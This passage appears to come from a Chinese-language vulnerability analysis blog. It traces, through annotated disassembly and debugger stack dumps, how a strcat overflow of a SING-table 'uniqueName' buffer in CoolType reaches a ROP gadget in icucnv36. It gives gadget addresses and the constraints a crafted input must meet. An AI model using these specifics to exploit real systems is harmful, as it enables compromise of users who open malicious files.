class="line"><span class="symbol">.text:</span>0803DD00      <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04      <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie     <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09      <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                    <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>       <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11      <span class="keyword">push</span>    <span class="number">4Ch</span>                         <span class="comment">; __EH_prolog3_catch函数中分配栈空间大小</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54     <span class="comment">; __security_check_cookie函数地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18      <span class="keyword">call</span>    __EH_prolog3_catch          <span class="comment">; 向栈上写入SEH结构</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD1D      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]       <span class="comment">; eax=[0x0012E4D8+0x11c]=[0x0012E5F4]=0x0012E700,eax = a4</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD23      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]       <span class="comment">; edi=[0x0012E4D8+0x110]=[0x0012E5E8]=0x0012E718,edi = a1 &lt;------对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD29      <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]       <span class="comment">; ebx=[0x0012E4D8+0x114]=[0x0012E5EC]=0x0012E608,ebx = a2 对象(0x0012E608)的指针</span></span><br><span class="line">........</span><br><span class="line"><span class="symbol">.text:</span>0803DDAB      <span class="keyword">call</span>    strcat                      <span class="comment">; 调用strcat函数，造成溢出</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB0      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB1      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB2      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; eax=0x0012E4D8,为uniqueName缓冲区地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB5      <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB6      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ebx</span>                    <span class="comment">; ecx=ebx=0x0012E608,对象(0x0012E608)的指针,第一个成员变量原来是0,可以直接跳过sub_8001243()的一段代码,但是我们构造的uniqueName不能将这里构造为0x0,会造成截断,其内容+0x1c必须为一个可访问的地址,使得程序可以顺利执行通过第一个成员变量为0时跳过的那段代码。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB8      <span class="keyword">call</span>    sub_8001243</span><br><span class="line"><span class="symbol">.text:</span>0803DDBD      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C]     <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DDC0 loc_803DDC0:                            </span><br><span class="line"><span class="symbol">.text:</span>0803DDC0      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC4</span><br><span class="line"><span class="symbol">.text:</span>0803DDC4 loc_803DDC4:                            </span><br><span class="line"><span class="symbol">.text:</span>0803DDC4      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC6      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDCA      <span class="keyword">jz</span>      short loc_803DDD3</span><br><span class="line"><span class="symbol">.text:</span>0803DDCC      <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDCD      <span class="keyword">call</span>    sub_80418BF</span><br><span class="line"><span class="symbol">.text:</span>0803DDD2      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDD3</span><br><span class="line"><span class="symbol">.text:</span>0803DDD3 loc_803DDD3:                           </span><br><span class="line"><span class="symbol">.text:</span>0803DDD3      <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDD7      <span class="keyword">jnz</span>     loc_803DEA9</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DEA9 loc_803DEA9:                           </span><br><span class="line"><span class="symbol">.text:</span>0803DEA9                                         </span><br><span class="line"><span class="symbol">.text:</span>0803DEA9      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]     <span class="comment">;   eax=ebp-0x1c=0x0012E4BC, ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAC      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg3: eax=0x0012E4BC</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAD      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg2: ebx=0x0012E608 对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAE      <span class="keyword">push</span>    <span class="built_in">edi</span>                         <span class="comment">; arg1: edi=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAF      <span class="keyword">call</span>    sub_8016BDE</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_8016BDE(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">********************************************************************                    </span><br><span class="line"><span class="symbol">.text:</span>08016BDE      <span class="keyword">push</span>    <span class="built_in">ebp</span>                         <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>08016BDF      <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">660h</span>                   <span class="comment">; esp=esp-0x660=0x0012DDFC,之前esp=0x0012E45C</span></span><br><span class="line"><span class="symbol">.text:</span>08016BE5      <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                <span class="comment">; ebp=esp-4=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016BE9      <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie</span><br><span class="line"><span class="symbol">.text:</span>08016BEE      <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF0      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF6      <span class="keyword">push</span>    <span class="number">50h</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF8      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8175D32</span><br><span class="line"><span class="symbol">.text:</span>08016BFD      <span class="keyword">call</span>    __EH_prolog3_catch</span><br><span class="line"><span class="symbol">.text:</span>08016C02      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_8]       <span class="comment">; eax=[ebp+0x674]=[0x0012E46C]=0x0012E4BC, eax=a3</span></span><br><span class="line"><span class="symbol">.text:</span>08016C08      <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_4]       <span class="comment">; esi=[ebp+0x670]=[0x0012E468]=0x0012E608, esi=a2,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C0E      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_0]       <span class="comment">; edi=[ebp+0x66c]=[0x0012E464]=0x0012E718,ebp=0x0012DDF8 &lt;------ edi = a1,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C14      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_6BC], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016C17      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset CriticalSection <span class="comment">; eax=0x0823A650,_RTL_CRITICAL_SECTION结构体对象指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C1C      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; lpCriticalSection</span></span><br><span class="line"><span class="symbol">.text:</span>08016C1D      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_680], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08016C20      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_6C0], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016C23      <span class="keyword">call</span>    <span class="built_in">ds</span>:EnterCriticalSection     <span class="comment">; 执行完 eax=0</span></span><br><span class="line"><span class="symbol">.text:</span>08016C29      <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                    <span class="comment">; ebx=0</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2B      <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2C      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_668], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2F      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_694], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C32      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_678], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C35      <span class="keyword">call</span>    sub_801BB1C                 <span class="comment">; 执行完 eax=0x01F347B8,为StreamHandler类对象,内存第一个双字为虚表指针,0x081A601C</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3A      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3C      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3D      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_67C], <span class="built_in">eax</span>     <span class="comment">; eax=0x01F347B8,为StreamHandler类对象</span></span><br><span class="line"><span class="symbol">.text:</span>08016C40      <span class="keyword">jz</span>      loc_80172CE                 <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>08016C46      <span class="keyword">push</span>    <span class="number">1</span>                           <span class="comment">; arg7: 1</span></span><br><span class="line"><span class="symbol">.text:</span>08016C48      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg6: 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>08016C49      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg5: 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4A      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_678]     <span class="comment">;   eax=[ebp-0x14]=0x0012DDE4,ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4D      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg4: eax=0x0012DDE4</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4E      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_694]     <span class="comment">;   eax=[ebp-0x30]=0x0012DDC8,ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C51      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg3: eax=0x0012DDC8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C52      <span class="keyword">push</span>    <span class="built_in">edi</span>                         <span class="comment">; arg2&lt;-a1: edi=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C53      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_67C]          <span class="comment">; arg1: [ebp-0x18]=[0x0012DDE0]=0x01F347B8 </span></span><br><span class="line"><span class="symbol">.text:</span>08016C56      <span class="keyword">call</span>    sub_801BB21</span><br><span class="line">                                               <span class="built_in">esp</span> --&gt;  0012DD6C   08016C5B  <span class="comment">; 返回到 CoolType.08016C5B 来自 CoolType.0801BB21</span></span><br><span class="line">                                                        0012DD70   01F347B8  <span class="comment">; arg1: StreamHandler类对象地址</span></span><br><span class="line">                                                        0012DD74   0012E718  <span class="comment">; arg2: 对象(0x0012E718)的指针</span></span><br><span class="line">                                                        0012DD78   0012DDC8  <span class="comment">; arg3</span></span><br><span class="line">                                                        0012DD7C   0012DDE4  <span class="comment">; arg4</span></span><br><span class="line">                                                        0012DD80   <span class="number">00000000</span>  <span class="comment">; arg5</span></span><br><span class="line">                                                        0012DD84   <span class="number">00000000</span>  <span class="comment">; arg6</span></span><br><span class="line">                                                        0012DD88   <span class="number">00000001</span>  <span class="comment">; arg7</span></span><br><span class="line">StreamHandler类对象内存：</span><br><span class="line"><span class="comment">;01F347B8  1C 60 1A 08 6D 00 00 00 00 00 00 00 84 90 13 02  `m.......剱</span></span><br><span class="line"><span class="comment">;01F347C8  00 00 00 00 00 00 00 00 6D 00 00 00 01 00 00 00  ........m......</span></span><br><span class="line"><span class="comment">;01F347D8  01 00 00 00 00 00 00 00 00 00 00 00 50 A6 23 08  ...........P?</span></span><br><span class="line"><span class="comment">;01F347E8  00 00 00 00 00 00 00 00 1C 01 00 00 00 00 00 00  ..............</span></span><br><span class="line"><span class="comment">;01F347F8  00 00 00 00 00 00 00 00 EF 33 08 08 E0 47 F3 01  ........?郍?</span></span><br><span class="line"><span class="comment">;01F34808  00 48 F3 01 00 00 00 00 00 00 00 00 00 00 00 00  .H?............</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*****************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">功能: 找到虚函数地址并调用</span><br><span class="line"><span class="keyword">int</span> __cdecl sub_801BB21(<span class="keyword">int</span> (__stdcall ***a1)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>), <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7)</span><br><span class="line"></span><br><span class="line">*****************************************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0801BB21      <span class="keyword">push</span>    <span class="built_in">ebp</span>                     <span class="comment">;   ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB22      <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                <span class="comment">;   ebp=esp=0x0012DD68</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB24      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_18]            <span class="comment">; arg6&lt;-a7: [ebp+0x20]=[0x0012DD88]=0x01</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB27      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_0]        <span class="comment">; this&lt;-a1: ecx=[ebp+0x8]=[0x0012DD670]=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2A      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_14]            <span class="comment">; arg5&lt;-a6: [ebp+0x1c]=[0x0012DD84]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2D      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>]              <span class="comment">;   eax=[ecx]=[0x01F347B8]=0x081A601C(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2F      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]            <span class="comment">; arg4&lt;-a5: [ebp+0x18]=[0x0012DD80]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB32      <span class="keyword">inc</span>     dword_823A6A0           <span class="comment">;   [0x0823A6A0]=0x0-&gt;0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB38      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_C]             <span class="comment">; arg3&lt;-a4: [ebp+0x14]=[0x0012DD7C]=0x0012DDE4</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB3B      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]             <span class="comment">; arg2&lt;-a3: [ebp+0x10]=[0x0012DD78]=0x0012DDC8</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB3E      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]             <span class="comment">; arg1&lt;-a2: [ebp+0xC]=[0x0012DD74]=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB41      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]         <span class="comment">;   [eax]=0x808B116(StreamHandler类虚函数)</span></span><br><span class="line">                                           <span class="built_in">esp</span> --&gt;  0012DD4C  0801BB43  返回到 CoolType.0801BB43</span><br><span class="line">                                                    0012DD50  0012E718  arg1 对象(<span class="number">0x0012E718</span>)的指针</span><br><span class="line">                                                    0012DD54  0012DDC8  arg2</span><br><span class="line">                                                    0012DD58  0012DDE4  arg3</span><br><span class="line">                                                    0012DD5C  <span class="number">00000000</span>  arg4</span><br><span class="line">                                                    0012DD60  <span class="number">00000000</span>  arg5</span><br><span class="line">                                                    0012DD64  <span class="number">00000001</span>  arg6</span><br><span class="line">                                           <span class="built_in">ebp</span> --&gt;  0012DD68  0012DDF8  </span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">****************************************************************************************************************************</span><br><span class="line"></span><br><span class="line"><span class="symbol">.rdata:</span>081A601C <span class="comment">; const StreamHandler::`vftable'</span></span><br><span class="line"><span class="symbol">.rdata:</span>081A601C ??_7StreamHandler@@6B@ <span class="built_in">dd</span> offset sub_808B116</span><br><span class="line"></span><br><span class="line">StreamHandler类虚函数：</span><br><span class="line">char __thiscall sub_808B116(char *this, <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3, _<span class="built_in">DWORD</span> *a4, _<span class="built_in">DWORD</span> *a5, unsigned <span class="keyword">int</span> *a6, <span class="keyword">int</span> a7)</span><br><span class="line"></span><br><span class="line">****************************************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0808B116      <span class="keyword">push</span>    <span class="built_in">ebp</span>                 <span class="comment">;   [0x0012DD48]=ebp=0x0012DD68</span></span><br><span class="line"><span class="symbol">.text:</span>0808B117      <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>            <span class="comment">;   ebp=esp=0x0012DD48</span></span><br><span class="line"><span class="symbol">.text:</span>0808B119      <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; arg_5: [0x0012DD44]=ecx=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11A      <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">; arg_4: [0x0012DD40]=ebx=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11B      <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; arg_3: [0x0012DD3C]=esi=0x0012E608 对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11C      <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; arg_2: [0x0012DD38]=edi=0x0012E718 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11D      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_0]    <span class="comment">;   edi=[ebp+0x8]=[0x0012DD50]=0x0012E718 &lt;------ edi = a2</span></span><br><span class="line"><span class="symbol">.text:</span>0808B120      <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; arg_1: [0x0012DD34]=edi=0x0012E718 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B121      <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">;   esi=ecx=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0808B123      <span class="keyword">call</span>    sub_808B02A         <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>0808B128      <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B12A      <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>0808B12C      <span class="keyword">jz</span>      loc_808B2CB</span><br><span class="line">..........</span><br><span class="line"><span class="symbol">.text:</span>0808B2CB      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2CD      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_14+<span class="number">3</span>], <span class="built_in">bl</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2D0      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">70h</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2D3      <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2D4      <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">esi</span>+<span class="number">14h</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2D7      <span class="keyword">call</span>    sub_801E540</span><br><span class="line"><span class="symbol">.text:</span>0808B2DC      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">0E0h</span>], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2E3      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>+<span class="number">3Ch</span>]   &lt;-------<span class="built_in">eax</span>=[<span class="built_in">edi</span>+<span class="number">3Ch</span>]=[<span class="number">0x0012E718</span>+<span class="number">0x3C</span>]=[<span class="number">0x0012E754</span>]=<span class="number">0x0012E6D0</span>(对象<span class="number">0x0012E6B0</span>中的一个函数指针)</span><br><span class="line"><span class="symbol">.text:</span>0808B2E6      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2E8      <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">2F4h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2EE      <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">2F8h</span>], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2F4      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2F7      <span class="keyword">jnz</span>     short loc_808B300</span><br><span class="line"><span class="symbol">.text:</span>0808B2F9</span><br><span class="line"><span class="symbol">.text:</span>0808B2F9 loc_808B2F9:                      </span><br><span class="line"><span class="symbol">.text:</span>0808B2F9      <span class="keyword">xor</span>     <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2FB      <span class="keyword">jmp</span>     loc_808B594</span><br><span class="line"><span class="symbol">.text:</span>0808B300 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0808B300</span><br><span class="line"><span class="symbol">.text:</span>0808B300 loc_808B300:                           </span><br><span class="line"><span class="symbol">.text:</span>0808B300      <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span>0808B303      <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; [0x0012DD34]=ecx=0x0012DD44</span></span><br><span class="line"><span class="symbol">.text:</span>0808B304      <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">; [0x0012DD30]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>0808B305      <span class="keyword">push</span>    <span class="number">3</span>                   <span class="comment">; [0x0012DD2C]=0x3</span></span><br><span class="line"><span class="symbol">.text:</span>0808B307      <span class="keyword">push</span>    <span class="built_in">eax</span>                 <span class="comment">; [0x0012DD28]=eax=0x0012E6D0</span></span><br><span class="line"><span class="symbol">.text:</span>0808B308      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]     <span class="comment">; eax=0x0012E6D0,[0x0012E6D0]=0x4A80CB38 &lt;------- ROPgadget1</span></span><br><span class="line">                    (*v20)(v20, <span class="number">3</span>, <span class="number">0</span>, &amp;v31)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p><strong><code>触发流程图:</code></strong></p><div align="left"><img src="/resources/2018/2018-06-01-04.png" width="80%" height="60%" alt="触发流程"></div><p>&emsp;&emsp;这里不知道为什么不能用ollydbg的<code>调用堆栈窗口</code>查看栈回溯,在调用<code>sub_808B116()</code>函数时,<code>栈回溯窗口</code>清空了,执行完<code>sub_808B116()</code>函数中的<code>0x0808B308</code>处的调用指令<code>call dword ptr [eax]</code>,跳转到<code>0x4A80CB38</code>处时,<code>调用堆栈信息</code>又显示出来了,而且此<code>ROPgadget的调用者</code>也发生了改变。下面显示<code>0x4A80CB38</code>处的<code>ROPgadget</code>的调用是来自<code>CoolType.0801BB41</code>,而这个地址在<code>sub_801BB21()</code>函数的地址范围中,并且是<code>调用sub_808B116()</code>函数的指令的地址。实际情况确是<code>sub_808B116()</code>函数调用的<code>0x4A80CB38</code>处的<code>ROPgadget</code>。是因为sub_808B116()函数是虚函数吗？没搞清楚。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--&gt; 4A80CB38    81C5 <span class="number">94070000</span>   <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x794</span></span><br><span class="line">    4A80CB3E    C9              <span class="keyword">leave</span></span><br><span class="line">    4A80CB3F    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;调用堆栈：     主线程</span></span><br><span class="line"><span class="comment">;地址        堆栈       函数过程 / 参数          调用来自                结构</span></span><br><span class="line"><span class="comment">;0012DD4C   0801BB43   icucnv36.4A80CB38       CoolType.0801BB41      0012DD48</span></span><br><span class="line"><span class="comment">;0012DD6C   08016C5B   ? CoolType.0801BB21     CoolType.08016C56      0012DD68</span></span><br><span class="line"><span class="comment">;0012E460   0803DEB4   ? CoolType.08016BDE     CoolType.0803DEAF      0012DDF8</span></span><br></pre></td></tr></table></figure><h5 id="2-4、触发原因"><a href="#2-4、触发原因" class="headerlink" 